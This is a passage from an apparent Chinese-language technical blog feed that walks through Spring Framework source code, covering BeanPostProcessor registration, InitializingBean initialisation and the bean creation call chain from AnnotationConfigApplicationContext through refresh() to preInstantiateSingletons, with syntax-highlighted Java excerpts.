punctuation">)</span><span class="token punctuation">;</span>      nonOrderedPostProcessors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>pp <span class="token keyword">instanceof</span> <span class="token class-name">MergedBeanDefinitionPostProcessor</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         internalPostProcessors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token function">registerBeanPostProcessors</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">,</span> nonOrderedPostProcessors<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Finally, re-register all internal BeanPostProcessors.</span>   <span class="token function">sortPostProcessors</span><span class="token punctuation">(</span>internalPostProcessors<span class="token punctuation">,</span> beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">registerBeanPostProcessors</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">,</span> internalPostProcessors<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Re-register post-processor for detecting inner beans as ApplicationListeners,</span>   <span class="token comment">// moving it to the end of the processor chain (for picking up proxies etc).</span>   beanFactory<span class="token punctuation">.</span><span class="token function">addBeanPostProcessor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ApplicationListenerDetector</span><span class="token punctuation">(</span>applicationContext<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>流程如上，和BeanFactoryPostProcessor 大致逻辑类似整个流程完成注册</p><h3 id="BeanPostProcessor执行"><a href="#BeanPostProcessor执行" class="headerlink" title="BeanPostProcessor执行"></a>BeanPostProcessor执行</h3><blockquote><p>由于各种类型的BeanPostProcessor在Bean的生命周期干扰的时机不同，所以执行的时机也是不同的，这里我们会分别针对各个子类BeanPostProcessor接口代码分析干扰的时机</p></blockquote><h4 id="SmartInstantiationAwareBeanPostProcessor"><a href="#SmartInstantiationAwareBeanPostProcessor" class="headerlink" title="SmartInstantiationAwareBeanPostProcessor"></a>SmartInstantiationAwareBeanPostProcessor</h4><h4 id="InstantiationAwareBeanPostProcessor"><a href="#InstantiationAwareBeanPostProcessor" class="headerlink" title="InstantiationAwareBeanPostProcessor"></a>InstantiationAwareBeanPostProcessor</h4><h4 id="MergedBeanDefinitionPostProcessor"><a href="#MergedBeanDefinitionPostProcessor" class="headerlink" title="MergedBeanDefinitionPostProcessor"></a>MergedBeanDefinitionPostProcessor</h4><h2 id="类型三：InitializingBean-完成bean-初始化后的操作"><a href="#类型三：InitializingBean-完成bean-初始化后的操作" class="headerlink" title="类型三：InitializingBean 完成bean 初始化后的操作"></a>类型三：InitializingBean 完成bean 初始化后的操作</h2><p>堆栈方法追踪：getBean-&gt;doGetBean-&gt;getSingleton-&gt;createBean-&gt;doCreateBean-&gt;initializeBean-&gt;invokeInitMethods  </p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">invokeInitMethods</span><span class="token punctuation">(</span><span class="token class-name">String</span> beanName<span class="token punctuation">,</span> <span class="token class-name">Object</span> bean<span class="token punctuation">,</span> <span class="token annotation punctuation">@Nullable</span> <span class="token class-name">RootBeanDefinition</span> mbd<span class="token punctuation">)</span>      <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">boolean</span> isInitializingBean <span class="token operator">=</span> <span class="token punctuation">(</span>bean <span class="token keyword">instanceof</span> <span class="token class-name">InitializingBean</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>isInitializingBean <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>mbd <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token operator">!</span>mbd<span class="token punctuation">.</span><span class="token function">isExternallyManagedInitMethod</span><span class="token punctuation">(</span><span class="token string">"afterPropertiesSet"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Invoking afterPropertiesSet() on bean with name '"</span> <span class="token operator">+</span> beanName <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">AccessController</span><span class="token punctuation">.</span><span class="token function">doPrivileged</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">PrivilegedExceptionAction</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>               <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">InitializingBean</span><span class="token punctuation">)</span> bean<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">afterPropertiesSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token function">getAccessControlContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>         <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PrivilegedActionException</span> pae<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> pae<span class="token punctuation">.</span><span class="token function">getException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>         <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">InitializingBean</span><span class="token punctuation">)</span> bean<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">afterPropertiesSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>mbd <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> bean<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token class-name">NullBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">String</span> initMethodName <span class="token operator">=</span> mbd<span class="token punctuation">.</span><span class="token function">getInitMethodName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">hasLength</span><span class="token punctuation">(</span>initMethodName<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>            <span class="token operator">!</span><span class="token punctuation">(</span>isInitializingBean <span class="token operator">&amp;&amp;</span> <span class="token string">"afterPropertiesSet"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>initMethodName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>            <span class="token operator">!</span>mbd<span class="token punctuation">.</span><span class="token function">isExternallyManagedInitMethod</span><span class="token punctuation">(</span>initMethodName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">invokeCustomInitMethod</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> bean<span class="token punctuation">,</span> mbd<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>bean 完成之后会执行InitializingBean.afterPropertiesSet</p><h2 id="整个生命周期流程后置处理器干扰图"><a href="#整个生命周期流程后置处理器干扰图" class="headerlink" title="整个生命周期流程后置处理器干扰图"></a>整个生命周期流程后置处理器干扰图</h2><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%A2%9E%E5%BC%BA%E5%99%A8.drawio.png"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Spring源码</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BeanPostProcessor</tag>
      
      <tag>BeanFactoryPostProcessor</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指源码-spring(三)-Bean初始化过程引出BeanPostProcessor</title>
    <link href="/posts/8f18475c.html"/>
    <url>/posts/8f18475c.html</url>
    
    <content type="html"><![CDATA[<p> 堆栈分析简单的了解下Bean初始化的过程，以xxxAware为例分析，引出BeanPostProcessor的概念</p><span id="more"></span><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Data</span><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span>  <span class="token keyword">implements</span> <span class="token class-name">ApplicationContextAware</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">private</span> <span class="token class-name">ApplicationContext</span> applicationContext<span class="token punctuation">;</span>   <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"person 被创建..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token annotation punctuation">@Override</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setApplicationContext</span><span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span> applicationContext<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span>      <span class="token comment">//  利用回调机制，将IOC注入进来</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>applicationContext<span class="token operator">=</span>applicationContext<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MainConfig</span> <span class="token punctuation">&#123;</span>   <span class="token annotation punctuation">@Bean</span>   <span class="token keyword">public</span> <span class="token class-name">Person</span> <span class="token function">person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">Person</span> person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      person<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"李四"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> person<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AnnotationMainTest</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">ApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigApplicationContext</span><span class="token punctuation">(</span><span class="token class-name">MainConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">Person</span> bean <span class="token operator">=</span> applicationContext<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>bean<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>注意断点位置</p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220424205139520.png" alt="image-20220424205139520"></p><p>堆栈追踪分析</p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220424205250721.png" alt="image-20220424205250721"></p><h2 id="堆栈分析"><a href="#堆栈分析" class="headerlink" title="堆栈分析"></a>堆栈分析</h2><h3 id="AnnotationConfigApplicationContext-构造函数"><a href="#AnnotationConfigApplicationContext-构造函数" class="headerlink" title="AnnotationConfigApplicationContext  构造函数"></a>AnnotationConfigApplicationContext  构造函数</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">AnnotationConfigApplicationContext</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> componentClasses<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">this</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">register</span><span class="token punctuation">(</span>componentClasses<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//刷新工厂</span>   <span class="token function">refresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="AbstractApplicationContext-refresh（）"><a href="#AbstractApplicationContext-refresh（）" class="headerlink" title="AbstractApplicationContext  refresh（）"></a>AbstractApplicationContext  refresh（）</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">refresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalStateException</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>startupShutdownMonitor<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">StartupStep</span> contextRefresh <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>applicationStartup<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token string">"spring.context.refresh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Prepare this context for refreshing.</span>      <span class="token function">prepareRefresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Tell the subclass to refresh the internal bean factory.</span>      <span class="token comment">//告诉子类刷新内部 bean 工厂。</span>      <span class="token class-name">ConfigurableListableBeanFactory</span> beanFactory <span class="token operator">=</span> <span class="token function">obtainFreshBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Prepare the bean factory for use in this context.</span>      <span class="token function">prepareBeanFactory</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>         <span class="token comment">// Allows post-processing of the bean factory in context subclasses.</span>         <span class="token function">postProcessBeanFactory</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token class-name">StartupStep</span> beanPostProcess <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>applicationStartup<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token string">"spring.context.beans.post-process"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Invoke factory processors registered as beans in the context.</span>         <span class="token function">invokeBeanFactoryPostProcessors</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Register bean processors that intercept bean creation.</span>         <span class="token function">registerBeanPostProcessors</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>         beanPostProcess<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Initialize message source for this context.</span>         <span class="token function">initMessageSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Initialize event multicaster for this context.</span>         <span class="token function">initApplicationEventMulticaster</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Initialize other special beans in specific context subclasses.</span>         <span class="token function">onRefresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Check for listener beans and register them.</span>         <span class="token function">registerListeners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Instantiate all remaining (non-lazy-init) singletons.</span>         <span class="token comment">// 完成Bean 工厂的初始化</span>         <span class="token function">finishBeanFactoryInitialization</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Last step: publish corresponding event.</span>         <span class="token function">finishRefresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">BeansException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isWarnEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            logger<span class="token punctuation">.</span><span class="token function">warn</span><span class="token punctuation">(</span><span class="token string">"Exception encountered during context initialization - "</span> <span class="token operator">+</span>                  <span class="token string">"cancelling refresh attempt: "</span> <span class="token operator">+</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>         <span class="token comment">// Destroy already created singletons to avoid dangling resources.</span>         <span class="token function">destroyBeans</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Reset 'active' flag.</span>         <span class="token function">cancelRefresh</span><span class="token punctuation">(</span>ex<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Propagate exception to caller.</span>         <span class="token keyword">throw</span> ex<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>         <span class="token comment">// Reset common introspection caches in Spring's core, since we</span>         <span class="token comment">// might not ever need metadata for singleton beans anymore...</span>         <span class="token function">resetCommonCaches</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         contextRefresh<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>refresh  会调用finishBeanFactoryInitialization 完成bean工厂的初始化</p><h3 id="AbstractApplicationContext-finishBeanFactoryInitialization"><a href="#AbstractApplicationContext-finishBeanFactoryInitialization" class="headerlink" title="AbstractApplicationContext finishBeanFactoryInitialization()"></a>AbstractApplicationContext finishBeanFactoryInitialization()</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">finishBeanFactoryInitialization</span><span class="token punctuation">(</span><span class="token class-name">ConfigurableListableBeanFactory</span> beanFactory<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// Initialize conversion service for this context.</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>beanFactory<span class="token punctuation">.</span><span class="token function">containsBean</span><span class="token punctuation">(</span><span class="token constant">CONVERSION_SERVICE_BEAN_NAME</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>         beanFactory<span class="token punctuation">.</span><span class="token function">isTypeMatch</span><span class="token punctuation">(</span><span class="token constant">CONVERSION_SERVICE_BEAN_NAME</span><span class="token punctuation">,</span> <span class="token class-name">ConversionService</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      beanFactory<span class="token punctuation">.</span><span class="token function">setConversionService</span><span class="token punctuation">(</span>            beanFactory<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token constant">CONVERSION_SERVICE_BEAN_NAME</span><span class="token punctuation">,</span> <span class="token class-name">ConversionService</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">// Register a default embedded value resolver if no BeanFactoryPostProcessor</span>   <span class="token comment">// (such as a PropertySourcesPlaceholderConfigurer bean) registered any before:</span>   <span class="token comment">// at this point, primarily for resolution in annotation attribute values.</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>beanFactory<span class="token punctuation">.</span><span class="token function">hasEmbeddedValueResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      beanFactory<span class="token punctuation">.</span><span class="token function">addEmbeddedValueResolver</span><span class="token punctuation">(</span>strVal <span class="token operator">-></span> <span class="token function">getEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">resolvePlaceholders</span><span class="token punctuation">(</span>strVal<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">// Initialize LoadTimeWeaverAware beans early to allow for registering their transformers early.</span>   <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> weaverAwareNames <span class="token operator">=</span> beanFactory<span class="token punctuation">.</span><span class="token function">getBeanNamesForType</span><span class="token punctuation">(</span><span class="token class-name">LoadTimeWeaverAware</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> weaverAwareName <span class="token operator">:</span> weaverAwareNames<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">getBean</span><span class="token punctuation">(</span>weaverAwareName<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">// Stop using the temporary ClassLoader for type matching.</span>   beanFactory<span class="token punctuation">.</span><span class="token function">setTempClassLoader</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Allow for caching all bean definition metadata, not expecting further changes.</span>   beanFactory<span class="token punctuation">.</span><span class="token function">freezeConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Instantiate all remaining (non-lazy-init) singletons.</span>   <span class="token comment">// 初始化所有的单实例bean</span>   beanFactory<span class="token punctuation">.</span><span class="token function">preInstantiateSingletons</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>beanFactory.preInstantiateSingletons() 初始化所有单实例bean ,这里是由 ConfigurableListableBeanFactory的子类**<u>DefaultListableBeanFactory</u>** 来实现</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">preInstantiateSingletons</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Pre-instantiating singletons in "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">// Iterate over a copy to allow for init methods which in turn register new bean definitions.</span>   <span class="token comment">// While this may not be part of the regular factory bootstrap, it does otherwise work fine.</span>   <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> beanNames <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>beanDefinitionNames<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Trigger initialization of all non-lazy singleton beans...</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> beanName <span class="token operator">:</span> beanNames<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">RootBeanDefinition</span> bd <span class="token operator">=</span> <span class="token function">getMergedLocalBeanDefinition</span><span class="token 